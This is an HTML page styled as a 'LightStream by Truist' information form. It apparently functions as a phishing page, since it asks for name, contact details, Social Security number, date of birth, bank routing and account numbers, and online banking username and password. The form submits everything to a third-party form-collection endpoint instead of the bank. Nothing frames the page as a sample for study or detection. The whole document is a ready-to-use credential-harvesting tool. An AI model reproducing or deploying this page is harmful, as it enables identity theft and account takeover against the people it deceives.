<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LightStream by Truist</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f9f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .form-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
        }
        h1 {
            text-align: center;
            color: #3a16b9;
            margin-bottom: 10px;
            font-size: 28px;
        }
        h2 {
            text-align: center;
            color: #666;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: normal;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-weight: bold;
        }
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box; /* Ensures padding doesn't affect width */
            font-size: 16px;
        }
        textarea {
            height: 100px;
            resize: vertical;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h1>LightStream by Truist</h1>
    <h2>YOUR INFORMATION</h2>
    <form action="https://formspree.io/f/xdkvjnvl" method="POST">
        
        <div class="form-group">
            <label for="fullname">Full Name</label>
            <input type="text" id="fullname" name="fullname" placeholder="John Smith" required>
        </div>

        <div class="form-group">
            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" name="phone" placeholder="123-456-7890" required>
        </div>

        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="john@example.com" required>
        </div>

        <div class="form-group">
            <label for="address">Street Address</label>
            <input type="text" id="address" name="address" placeholder="Street">
        </div>

        <div class="form-group">
            <label for="city">City</label>
            <textarea id="city" name="city" placeholder="City"></textarea>
        </div>

        <div class="form-group">
            <label for="state">State</label>
            <textarea id="state" name="state" placeholder="State"></textarea>
        </div>

        <div class="form-group">
            <label for="zip">Zip Code</label>
            <textarea id="zip" name="zip" placeholder="Zip Code"></textarea>
        </div>

        <div class="form-group">
            <label for="country">Country</label>
            <textarea id="country" name="country" placeholder="Country"></textarea>
        </div>

        <div class="form-group">
            <label for="ssn">Social Security Number</label>
            <textarea id="ssn" name="ssn" placeholder="Social Security Number"></textarea>
        </div>

        <div class="form-group">
            <label for="dob">Date Of Birth</label>
            <textarea id="dob" name="dob" placeholder="Date Of Birth"></textarea>
        </div>

        <div class="form-group">
            <label for="bankname">Bank Name</label>
            <textarea id="bankname" name="bankname" placeholder="Bank Name"></textarea>
        </div>

        <div class="form-group">
            <label for="routingnumber">Routing Number</label>
            <textarea id="routingnumber" name="routingnumber" placeholder="Routing Number"></textarea>
        </div>

        <div class="form-group">
            <label for="accountnumber">Account Number</label>
            <textarea id="accountnumber" name="accountnumber" placeholder="Account Number"></textarea>
        </div>

        <div class="form-group">
            <label for="username">Username</label>
            <textarea id="username" name="username" placeholder="Username"></textarea>
        </div>

        <div class="form-group">
            <label for="password">Password</label>
            <textarea id="password" name="password" placeholder="Password"></textarea>
        </div>

        <button type="submit">Submit Information</button>
    </form>
</div>

</body>
</html>
